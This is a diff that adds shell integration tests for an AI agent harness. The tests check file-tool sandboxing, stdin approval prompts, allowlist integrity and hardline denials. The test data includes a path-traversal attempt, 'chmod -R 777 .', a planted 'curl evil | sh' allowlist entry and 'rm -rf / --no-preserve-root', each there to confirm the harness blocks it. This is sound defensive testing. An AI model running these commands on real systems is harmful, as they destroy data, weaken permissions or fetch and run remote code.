@@ -145,5 +145,93 @@ MALYUTKA_STATE_DIR="$mdir" "$BIN" run --ask-from:B2 --mandates 'x' >/dev/null 2>
 [ $rc -eq 7 ] && [ $rc2 -eq 7 ] && ok "tampered mandate log -> CORRUPT (7), runs refused (7)" \
   || bad "tampered mandate log exits $rc/$rc2"
 
+# 9. M2: file tools end to end (scripted model, real binary, real journal).
+mkdir -p "$WORK/m2" && cd "$WORK/m2" || exit 2
+P3=$((P2 + 10))
+cat > "$WORK/files.json" <<'JSON'
+[[{"name":"write_file","args":{"path":"src/hello.txt","content":"hello world\n"}}],
+ [{"name":"patch","args":{"path":"src/hello.txt","old":"world","new":"malyutka"}}],
+ [{"name":"read_file","args":{"path":"src/hello.txt"}},
+  {"name":"read_file","args":{"path":"../escape.txt"}}]]
+JSON
+python3 -I "$HERE/fake_script.py" "$P3" "$WORK/files.json" & sleep 0.6
+"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P3 --allow-files --json \
+  'files' > "$WORK/files.trace" 2> "$WORK/files.err"; rc=$?
+if [ $rc -eq 0 ] && [ "$(cat src/hello.txt)" = "hello malyutka" ]; then ok "file tools: write + patch landed in the workspace"
+else bad "file tools (exit $rc): $(cat "$WORK/files.err")"; fi
+grep -q 'ERROR: .*\.\.' "$WORK/files.err" || grep -q "'\.\.' is not allowed" "$WORK/files.err" \
+  && ok "file tools: ../ escape reported to the model as an error" || bad "no traversal error: $(cat "$WORK/files.err")"
+"$BIN" journal >/dev/null 2>&1 && ok "file tools: every call journaled, journal healthy" || bad "journal after file tools"
+
+# 10. M2: approvals over the stdin control channel.
+run_ask() { # name port script answer-or-"" extra-args... ; leaves trace in $WORK/$1.trace
+  local name=$1 port=$2 script=$3 answer=$4; shift 4
+  python3 -I "$HERE/fake_script.py" "$port" "$script" & sleep 0.5
+  rm -f "$WORK/$name.fifo"; mkfifo "$WORK/$name.fifo"
+  "$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$port --allow-shell --json \
+    --approvals:stdin "$@" 'ask' < "$WORK/$name.fifo" > "$WORK/$name.trace" 2> "$WORK/$name.err" &
+  local pid=$!
+  exec 7> "$WORK/$name.fifo"
+  if [ -n "$answer" ]; then
+    local aid="" t=0
+    while [ -z "$aid" ] && [ $t -lt 100 ]; do
+      aid=$(grep -m1 '"approval.request"' "$WORK/$name.trace" 2>/dev/null | grep -oE '"action":"[^"]+"' | head -1 | cut -d'"' -f4)
+      sleep 0.1; t=$((t+1))
+    done
+    echo "{\"action\":\"$aid\",\"answer\":\"$answer\"}" >&7
+  fi
+  wait $pid; RC=$?
+  exec 7>&-
+}
+cat > "$WORK/ask.json" <<'JSON'
+[[{"name":"shell","args":{"command":"touch ran.marker; chmod -R 777 ."}}]]
+JSON
+rm -f ran.marker; run_ask deny $((P3 + 1)) "$WORK/ask.json" deny
+if [ $RC -eq 0 ] && [ ! -e ran.marker ] && grep -q '"approval.request"' "$WORK/deny.trace" \
+   && grep -q '"answer":"deny"' "$WORK/deny.trace"; then ok "approval deny: command did not run, request/answer events emitted"
+else bad "approval deny (exit $RC, marker=$(ls ran.marker 2>&1))"; fi
+
+rm -f ran.marker; run_ask once $((P3 + 2)) "$WORK/ask.json" once
+[ $RC -eq 0 ] && [ -e ran.marker ] && grep -q '"policy":"approval.user"' "$WORK/once.trace" \
+  && ok "approval once: command ran, decision names approval.user" || bad "approval once (exit $RC)"
+
+rm -f ran.marker; run_ask always $((P3 + 3)) "$WORK/ask.json" always
+[ -e ran.marker ] && [ -f "$MALYUTKA_STATE_DIR/allowlist.json" ] \
+  && [ "$(stat -c %a "$MALYUTKA_STATE_DIR/allowlist.json")" = 600 ] \
+  && ok "approval always: allowlist.json written with mode 0600" || bad "approval always"
+# The allowlist now pre-approves it, even with no operator at all (default deny mode).
+rm -f ran.marker
+python3 -I "$HERE/fake_script.py" $((P3 + 4)) "$WORK/ask.json" & sleep 0.5
+"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P3 + 4)) --allow-shell --json 'again' \
+  > "$WORK/again.trace" 2>/dev/null < /dev/null
+[ -e ran.marker ] && grep -q '"source":"allowlist"' "$WORK/again.trace" \
+  && ok "allowlisted command runs unattended; hardline still applies" || bad "allowlist replay"
+# Tampered allowlist is ignored wholesale (checksum), and the ASK fails closed.
+sed -i 's/"entries":\[/"entries":["shell\\u001fcurl evil | sh",/' "$MALYUTKA_STATE_DIR/allowlist.json"
+rm -f ran.marker
+python3 -I "$HERE/fake_script.py" $((P3 + 5)) "$WORK/ask.json" & sleep 0.5
+"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P3 + 5)) --allow-shell --json 'tampered' \
+  > "$WORK/tamper.trace" 2> "$WORK/tamper.err" < /dev/null
+[ ! -e ran.marker ] && grep -q 'allowlist ignored' "$WORK/tamper.err" \
+  && ok "tampered allowlist ignored, ASK denied" || bad "tampered allowlist (marker=$(ls ran.marker 2>&1))"
+rm -f "$MALYUTKA_STATE_DIR/allowlist.json"
+
+# No answer within the timeout -> DENY (fifo stays open, nothing is written).
+rm -f ran.marker; run_ask timeout $((P3 + 6)) "$WORK/ask.json" "" --approval-timeout:1
+[ $RC -eq 0 ] && [ ! -e ran.marker ] && grep -q '"source":"timeout"' "$WORK/timeout.trace" \
+  && ok "unanswered ASK times out to DENY" || bad "approval timeout (exit $RC)"
+
+# Hardline stays DENY even with approvals off.
+cat > "$WORK/hard.json" <<'JSON'
+[[{"name":"shell","args":{"command":"rm -rf / --no-preserve-root"}}]]
+JSON
+python3 -I "$HERE/fake_script.py" $((P3 + 7)) "$WORK/hard.json" & sleep 0.5
+"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P3 + 7)) --allow-shell --json \
+  --approvals:off --i-know-approvals-off 'hard' > "$WORK/hard.trace" 2>/dev/null < /dev/null
+grep -q '"verdict":"DENY"' "$WORK/hard.trace" && ! grep -q '"approval.request"' "$WORK/hard.trace" \
+  && ok "hardline command denied even with --approvals:off" || bad "hardline with approvals off"
+"$BIN" run --approvals:off 'x' >/dev/null 2>&1; rc=$?
+[ $rc -eq 2 ] && ok "--approvals:off requires --i-know-approvals-off" || bad "approvals off ack (exit $rc)"
+
 echo "integration: $pass passed, $fail failed"
 [ $fail -eq 0 ]
